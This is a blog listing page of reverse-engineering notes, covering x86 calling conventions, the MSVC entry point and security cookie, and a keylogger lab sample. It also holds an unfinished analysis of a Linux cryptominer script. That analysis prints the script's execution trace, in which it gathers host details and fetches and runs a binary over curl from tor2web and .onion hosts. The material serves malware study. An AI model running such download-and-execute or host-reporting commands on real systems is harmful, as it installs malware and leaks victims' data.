<li>Return values of 64 bit size(QWORD) are returned in EDX:EAX(The main value is in the EDX Register)</li>
<li>Return Structures are returned by reference with a pointer in EAX</li>
<li>Registers ESI,EDI,EBX,and EBP are restored(non-volatile)</li>
<li>MSDN is your friend</li>
</ul>
<h3 id="cdecl"><a href="#cdecl" class="headerlink" title="__cdecl"></a><code>__cdecl</code></h3><ul>
<li><p>Default calling convention for c and c++</p>
</li>
<li><p>Arguments are passed on the stack(pushed right-to-left)</p>
</li>
<li><p>Called is responsible for stack cleanup will (cdecl will clean the stack )</p>
<ul>
<li><p>this is important when there are variadic functions,so function doesn’t</p>
<p>worry about stack cleaning.</p>
</li>
</ul>
</li>
<li><p>Supports varag(variadic)functions</p>
</li>
</ul>
<p>Example code below:</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220407182649772.png" alt="image-20220407182649772"></p>
<p>then we can get follow code with ida</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220407182717320-20220407202633645-20220407202659160.png" alt="image-20220407182717320"></p>
<ul>
<li>sub_401090 is the hello1 function</li>
<li>sub_401000 is the addingNumberVariadic function which is variadic<ul>
<li>notice that caller clean the stack when the function return</li>
</ul>
</li>
</ul>
<h3 id="stdcall"><a href="#stdcall" class="headerlink" title="__stdcall"></a>__stdcall</h3><p>The <strong><code>__stdcall</code></strong> calling convention is used to call Win32 API functions. <code>The callee cleans the stack</code>, so the compiler makes <code>vararg</code> functions <strong><code>__cdecl</code></strong>. Functions that use this calling convention require a function prototype. The <strong><code>__stdcall</code></strong> modifier is Microsoft-specific.</p>
<table>
<thead>
<tr>
<th>Element</th>
<th>Implementation</th>
</tr>
</thead>
<tbody><tr>
<td>Argument-passing order</td>
<td>Right to left.</td>
</tr>
<tr>
<td>Argument-passing convention</td>
<td>By value, unless a pointer or reference type is passed.</td>
</tr>
<tr>
<td>Stack-maintenance responsibility</td>
<td>Called function pops its own arguments from the stack.</td>
</tr>
<tr>
<td>Name-decoration convention</td>
<td>An underscore (<code>_</code>) is prefixed to the name. The name is followed by the at sign (<code>@</code>) followed by the number of bytes (in decimal) in the argument list. Therefore, the function declared as <code>int func( int a, double b )</code> is decorated as follows: <code>_func@12</code></td>
</tr>
</tbody></table>
<h3 id="fastcall"><a href="#fastcall" class="headerlink" title="__fastcall"></a>__fastcall</h3><p>The <strong><code>__fastcall</code></strong> calling convention specifies that arguments to functions are to be passed in registers, when possible. This calling convention only applies to the x86 architecture. The following list shows the implementation of this calling convention.</p>
<table>
<thead>
<tr>
<th align="left">Element</th>
<th align="left">Implementation</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Argument-passing order</td>
<td align="left">The first two DWORD or smaller arguments that are found in the argument list from left to right are passed in ECX and EDX registers; all other arguments are passed on the stack from right to left.</td>
</tr>
<tr>
<td align="left">Stack-maintenance responsibility</td>
<td align="left">Called function pops the arguments from the stack.</td>
</tr>
<tr>
<td align="left">Name-decoration convention</td>
<td align="left">At sign (@) is prefixed to names; an at sign followed by the number of bytes (in decimal) in the parameter list is suffixed to names.</td>
</tr>
<tr>
<td align="left">Case-translation convention</td>
<td align="left">No case translation performed.</td>
</tr>
</tbody></table>
<h3 id="thiscall"><a href="#thiscall" class="headerlink" title="__thiscall"></a>__thiscall</h3><p>The <strong>Microsoft-specific</strong> <strong><code>__thiscall</code></strong> calling convention is used on C++ class member functions on the x86 architecture. It’s the default calling convention used by member functions that don’t use variable arguments (<code>vararg</code> functions).</p>
<p>Under __thiscall, <code>the callee cleans the stack</code>, which is impossible for <code>vararg functions</code>. Arguments are pushed on the stack from right to left. <u>The <strong><code>this</code></strong> pointer is passed via register ECX, and not on the stack</u>.</p>
<blockquote>
<p><code>vararg</code> member functions use the <strong><code>__cdecl</code></strong> calling convention. All function arguments are pushed on the stack, with the <strong><code>this</code></strong> pointer placed on the stack last.</p>
</blockquote>
<p>Because this calling convention applies only to C++, it doesn’t have a C name decoration scheme.</p>
<p>When you define a non-static class member function out-of-line, specify the calling convention modifier only in the declaration. You don’t have to specify it again on the out-of-line definition. The compiler uses the calling convention specified during declaration at the point of definition.</p>
<h3 id="vectorcall"><a href="#vectorcall" class="headerlink" title="__vectorcall"></a>__vectorcall</h3><p>The <strong><code>__vectorcall</code></strong> calling convention specifies that arguments to functions are to be passed in registers. <strong><code>__vectorcall</code></strong> uses more registers for arguments than <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/fastcall?view=msvc-170"><code>__fastcall</code></a> or the default <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">x64 calling convention</a>(rcx rdx r7 r8 [rsp+[size of arg]) use. The <strong><code>__vectorcall</code></strong> calling convention is only supported in native code on x86 and x64 processors that<u>  include Streaming SIMD Extensions 2 (SSE2) and above.</u> Use <strong><code>__vectorcall</code></strong> to speed functions that pass several floating-point or SIMD vector arguments and perform operations that take advantage of the arguments loaded in registers. The following list shows the features that are common to the x86 and x64 implementations of <strong><code>__vectorcall</code></strong>. The differences are explained later in this article.</p>
<blockquote>
<p>to be continue one day</p>
</blockquote>
<p>Reference:</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170">https://docs.microsoft.com/en-us/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170</a></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-07</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 834 words, 2 min 46 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/04/oep-tricks/">oep_tricks</a></h3></div><div class="post-content"><div class="card"><p><h1 id="OEP-tricks"><a href="#OEP-tricks" class="headerlink" title="OEP tricks"></a>OEP tricks</h1><h2 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h2><p>Why is the PE Entry Point Not the same as Main Understanding <code>__security__init__cookie</code>and<code>scrt_common_main_seh</code></p>
<p>在第一次学习如何对 Windows 二进制文件进行逆向工程时，尤其是在使用调试器时，这是一个需要理解的重要概念。 当调试器在 PE 入口点上中断时，通常会让人感到困惑，只是为了找到一些与二进制文件的主要功能无关的代码。 此代码通常称为<code>boilerplate</code>代码，由 MSVC 编译器自动插入。 这对我们识别代码和方向有很大帮助。</p>
<h3 id="MSVC-console-Application-Entry-point"><a href="#MSVC-console-Application-Entry-point" class="headerlink" title="MSVC console Application Entry point"></a>MSVC console Application Entry point</h3><p>The Entry Point on an MSVC console application servers two purples .</p>
<ul>
<li>calls the <code>__security__init_cookie</code> function </li>
<li>jumps to the <code>__scrt_common_main_seh</code>thunk<ul>
<li>The __scrt_common_main_seh thunk then performs some setup for the binary including some structured exception handler (SEH) setup and then calls  main.</li>
</ul>
</li>
</ul>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403215142052.png" alt="image-20220403215142052"></p>
<h3 id="security-init-cookie"><a href="#security-init-cookie" class="headerlink" title="__security_init_cookie"></a>__security_init_cookie</h3><blockquote>
<p>The purpose of this cookie is best described by <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/security-init-cookie?view=msvc-170">MSDN</a></p>
<p>全局安全 cookie 用于在使用 &#x2F;GS（缓冲区安全检查）编译的代码和使用异常处理的代码中进行缓冲区溢出保护。</p>
<p>在进入受溢出保护的函数时，cookie 被放入堆栈，而在退出时，堆栈上的值与全局 cookie 进行比较。 它们之间的任何差异都表明发生了缓冲区溢出并导致程序立即终止。</p>
</blockquote>
<p>Normally, <strong><code>__security_init_cookie</code></strong> is called by the CRT when it’s initialized. If you bypass CRT initialization—for example, if you use <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/build/reference/entry-entry-point-symbol?view=msvc-170"><code>/ENTRY</code></a> to specify an entry-point—then you must call </p>
<p><strong><code>__security_init_cookie</code></strong> yourself. If <strong><code>__security_init_cookie</code></strong> isn’t called, the global security cookie is set to a default value and  buffer overrun protection is compromised. Because an attacker can  exploit this default cookie value to defeat the buffer overrun checks,  we recommend that you always call </p>
<p><strong><code>__security_init_cookie</code></strong> when you define your own entry point.</p>
<blockquote>
<p>we can use the opcode <code>48 89 5C 24 20 55 48 8B EC 48 83 EC 20</code> to find the <code>__security_init_cookie</code></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403230636976.png" alt="image-20220403230636976"></p>
</blockquote>
<p>The call to <strong><code>__security_init_cookie</code></strong> must be made before any overrun-protected function is entered; otherwise a  spurious buffer overrun will be detected. For more information, see <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/error-messages/tool-errors/c-runtime-error-r6035?view=msvc-170">C Runtime Error R6035</a>.</p>
<h3 id="scrt-common-main-seh"><a href="#scrt-common-main-seh" class="headerlink" title="__scrt_common_main_seh"></a>__scrt_common_main_seh</h3><p>Looking at this code without labels (for example in x64dbg) it can be confusing to identify where main is. Luckily MSVC console applications all have the same main function prototype.</p>
<blockquote>
<p>*main(int argc, const char **argv, const char *<em>envp)</em></p>
</blockquote>
<p>This function prototype can be used to identify the call to main in __scrt_common_main_seh, simply by looking for the three arguments that are passed to main: <em>argc</em>, <em>argv</em>, <em>envp</em>.</p>
<ul>
<li><p>In 64-bit binaries these arguments are compiled into a series of three <em>mov</em> instructions moving the arguments into the registers <code>RCX, RDX, R8</code></p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403225145892.png" alt="image-20220403225145892"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4C 8B C7                mov     r8, rdi         ; envp</span><br><span class="line">48 8B D3                mov     rdx, rbx        ; argv</span><br><span class="line">8B 08                   mov     ecx, [rax]      ; argc</span><br></pre></td></tr></table></figure>

</li>
<li><p>In 32-bit binaries these arguments are compiled into a series of three <em>push</em> instructions pushing the arguments onto the stack.</p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403225150632.png" alt="image-20220403225150632"></p>
</li>
</ul>
<blockquote>
<p>！！！！！！These patterns can be relied on to identify main. ！！！！！！！</p>
</blockquote>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-04</span><i class="fa fa-tag"></i><a class="tag" href="/tags/msvc/" title="msvc">msvc </a><span class="leancloud_visitors"></span><span>About 637 words, 2 min 7 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/01/keylog/">keylog</a></h3></div><div class="post-content"><div class="card"><p><blockquote>
<p>样本来源：lab03-03</p>
<p>md5: e2bf42217a67e46433da8b6f4507219e</p>
</blockquote>
<p>动态解密资源里的PE后得到了keylog的代码部分。这里不写。</p>
<h2 id="keylog-Analysis"><a href="#keylog-Analysis" class="headerlink" title="keylog Analysis"></a>keylog Analysis</h2><p>通过伪代码我可以很清楚得看到keylog的几步</p>
<ul>
<li>FindWindowA</li>
<li>ShowWindow</li>
<li>GetModuleHandleA</li>
<li>SetWindowHookExA</li>
<li>unhookWindowsHookEx</li>
</ul></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-01</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 952 words, 3 min 10 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/03/29/malware/"></a></h3></div><div class="post-content"><div class="card"><p><h1 id="mining-Virus-Analysis"><a href="#mining-Virus-Analysis" class="headerlink" title="mining Virus Analysis"></a>mining Virus Analysis</h1><p>md5: eeb8f9ae60c73f84ff85bbeab9c0b6ee</p>
<p>filename: .systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6</p>
<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><p>sh文件，简单易懂的base64混淆</p>
<p><img src="/malware.assets/image-20220329175059573.png" alt="image-20220329175059573"></p>
<p>解密后得到脚本step-2</p>
<h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><ol>
<li><p><code>exec &amp;&gt;/dev/null</code>不允许输出</p>
</li>
<li><p><code>export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</code>设置环境变量</p>
</li>
<li><p>&#96;&#96;&#96;<br>┌──(kali㉿kali)-[~]<br>└─$ grep x:$(id -u): &#x2F;etc&#x2F;passwd|cut -d: -f6<br>&#x2F;home&#x2F;kali</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4. curl参数设置，这边curl携带的参数为`curl -4fsSLkA- -m200`</span><br><span class="line"></span><br><span class="line">   `-4`(`--ipv4` Resolve names to IPv4 addresses)</span><br><span class="line"></span><br><span class="line">   `--fail`,`--silent`,`--show-error`(Show error even when -s is used),</span><br><span class="line"></span><br><span class="line">   `-L`(`--location` follow the direction)</span><br><span class="line"></span><br><span class="line">   `-k`(`--insecure` Allow insecure server connections),</span><br><span class="line"></span><br><span class="line">   `-A`(`--user-agent &lt;name&gt;`Send User-Agent &lt;name&gt; to server)</span><br><span class="line"></span><br><span class="line">    `-m`(`--max-time` &lt;fractional seconds&gt; Maximum time allowed for transfer)</span><br><span class="line"></span><br><span class="line">5. 设置了三个函数`u`,`sockz`,`fexe`，太多了，不想看了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">暴力解决sh，我们得到如下执行顺序</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;usr&#x2F;games:&#x2F;home&#x2F;kali:&#x2F;bin:&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin</li>
<li>PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;usr&#x2F;games:&#x2F;home&#x2F;kali:&#x2F;bin:&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin</li>
</ul>
<p>++ cut -d: -f6<br>+++ id -u<br>++ grep x:1000: &#x2F;etc&#x2F;passwd</p>
<ul>
<li>d&#x3D;&#x2F;home&#x2F;kali</li>
</ul>
<p>++ echo ‘curl -4fsSLkA- -m200’</p>
<ul>
<li>c&#x3D;’curl -4fsSLkA- -m200’</li>
</ul>
<p>++ echo 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad</p>
<ul>
<li>t&#x3D;5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad</li>
<li>for h in tor2web.in tor2web.it</li>
</ul>
<p>++ head -n 1 &#x2F;tmp&#x2F;.X11-unix&#x2F;01<br>head: cannot open ‘&#x2F;tmp&#x2F;.X11-unix&#x2F;01’ for reading: No such file or directory</p>
<ul>
<li>ls &#x2F;proc&#x2F;&#x2F;status<br>ls: cannot access ‘&#x2F;proc&#x2F;&#x2F;status’: No such file or directory</li>
<li>fexe</li>
<li>for i in . $HOME &#x2F;usr&#x2F;bin $d &#x2F;var&#x2F;tmp</li>
<li>echo exit</li>
<li>chmod +x .&#x2F;i</li>
<li>cd .</li>
<li>.&#x2F;i</li>
<li>break</li>
<li>u 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.tor2web.in</li>
<li>sockz</li>
<li>n&#x3D;(doh.this.web.id doh.post-factum.tk dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh-fi.blahdns.com fi.doh.dns.snopyta.org resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)</li>
</ul>
<p>++ echo ‘dns-query?name&#x3D;relay.tor2socks.in’</p>
<ul>
<li>p&#x3D;’dns-query?name&#x3D;relay.tor2socks.in’</li>
</ul>
<p>++ grep -oE ‘\b([0-9]{1,3}.){3}[0-9]{1,3}\b’<br>++ curl -4fsSLkA- -m200 ‘<a target="_blank" rel="noopener" href="https://doh.li/dns-query?name=relay.tor2socks.in&#39;">https://doh.li/dns-query?name=relay.tor2socks.in&#39;</a><br>++ grep -Ev ‘[.]0’<br>++ tr ‘ ‘ ‘\n’<br>++ sort -uR<br>++ head -n 1<br>curl: (35) OpenSSL SSL_connect: Connection reset by peer in connection to doh.li:443 </p>
<ul>
<li>s&#x3D;</li>
</ul>
<p>++ uname -m</p>
<ul>
<li>f&#x3D;&#x2F;int.x86_64</li>
</ul>
<p>++ date<br>++ md5sum<br>++ cut -f1 -d-</p>
<ul>
<li>x&#x3D;’.&#x2F;90aab6fe6a62477d35a888699d973c67  ‘</li>
</ul>
<p>++ curl -4fsSLk checkip.amazonaws.com<br>++ whoami<br>++ uname -m<br>++ uname -n<br>++ ip a<br>++ grep ‘inet ‘<br>++ awk ‘{print $2}’<br>++ awk ‘{print $1}’<br>++ md5sum<br>++ base64 -w0<br>++ crontab -l<br>no crontab for kali</p>
<ul>
<li>r&#x3D;xx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_</li>
<li>curl -4fsSLkA- -m200 -x socks5h:&#x2F;&#x2F;:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion&#x2F;int.x86_64 -o.&#x2F;90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_<br>curl: (5) Unsupported proxy syntax in ‘socks5h:&#x2F;&#x2F;:9050’</li>
<li>curl -4fsSLkA- -m200 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.tor2web.in&#x2F;int.x86_64 -o.&#x2F;90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_</li>
<li>echo .socks5h:&#x2F;&#x2F;:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion&#x2F;int.x86_64 -o.&#x2F;90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_<br>.socks5h:&#x2F;&#x2F;:9050 5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad.onion&#x2F;int.x86_64 -o.&#x2F;90aab6fe6a62477d35a888699d973c67 -exx.xx.xxx.xxx_kali_x86_64_kali_3f6b5f40be5a51750b281e352ee16e98_</li>
<li>chmod +x .&#x2F;90aab6fe6a62477d35a888699d973c67</li>
<li>.&#x2F;90aab6fe6a62477d35a888699d973c67</li>
</ul>
<p>++ head -n 1 &#x2F;tmp&#x2F;.X11-unix&#x2F;01</p>
<ul>
<li>ls &#x2F;proc&#x2F;266947&#x2F;status<br>&#x2F;proc&#x2F;266947&#x2F;status</li>
</ul>
<p>++ head -n 1 &#x2F;tmp&#x2F;.X11-unix&#x2F;01</p>
<ul>
<li>ls &#x2F;proc&#x2F;266947&#x2F;status<br>&#x2F;proc&#x2F;266947&#x2F;status</li>
<li>for h in tor2web.in tor2web.it</li>
</ul>
<p>++ head -n 1 &#x2F;tmp&#x2F;.X11-unix&#x2F;01</p>
<ul>
<li>ls &#x2F;proc&#x2F;266947&#x2F;status<br>&#x2F;proc&#x2F;266947&#x2F;status</li>
<li>break<br>&#96;&#96;&#96;</li>
</ul>
<p>部分命令需要提权，linux病毒分析这块没学过，后面肯定不跟下去了。以后有机会再分析。</p>
<p><img src="/malware.assets/image-20220329185108458.png" alt="image-20220329185108458"></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-03-29</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 1107 words, 3 min 41 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/03/29/mining-sh-analysis/">mining-sh-analysis</a></h3></div><div class="post-content"><div class="card"><p><h1 id="mining-Virus-Analysis"><a href="#mining-Virus-Analysis" class="headerlink" title="mining Virus Analysis"></a>mining Virus Analysis</h1><p>md5: eeb8f9ae60c73f84ff85bbeab9c0b6ee</p>
<p>filename: .systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6</p></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-03-29</span><i class="fa fa-tag"></i><a class="tag" href="/tags/linux/" title="linux">linux </a><span class="leancloud_visitors"></span><span>About 1107 words, 3 min 41 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/03/23/about/">about</a></h3></div><div class="post-content"><div class="card"><p></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-03-23</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 0 words, 0 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/03/23/hello/">hello</a></h3></div><div class="post-content"><div class="card"><p><p>新搭建博客了，欢迎来踩！</p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-03-23</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 12 words, 2 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/03/23/bokbot-analysis/">bokbot-analysis</a></h3></div><div class="post-content"><div class="card"><p><h1 id="2021-12-10-FRIDAY-TA551-SHATHAK-ICEDID-BOKBOT-WITH-COBALT-STRIKE-AND-DARK-VNC"><a href="#2021-12-10-FRIDAY-TA551-SHATHAK-ICEDID-BOKBOT-WITH-COBALT-STRIKE-AND-DARK-VNC" class="headerlink" title="2021-12-10 (FRIDAY) - TA551 (SHATHAK) ICEDID (BOKBOT) WITH COBALT STRIKE AND DARK VNC"></a>2021-12-10 (FRIDAY) - TA551 (SHATHAK) ICEDID (BOKBOT) WITH COBALT STRIKE AND DARK VNC</h1><p><a target="_blank" rel="noopener" href="https://www.malware-traffic-analysis.net/2021/12/10/index.html">https://www.malware-traffic-analysis.net/2021/12/10/index.html</a></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/FGSeYrxX0AMNOla.jpg" alt="Tweets with replies by Cryptolaemus (@Cryptolaemus1) / Twitter"></p></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-03-23</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 1655 words, 5 min 31 sec  read</span></div></div></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/page/2/">Next</a></li></ul></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>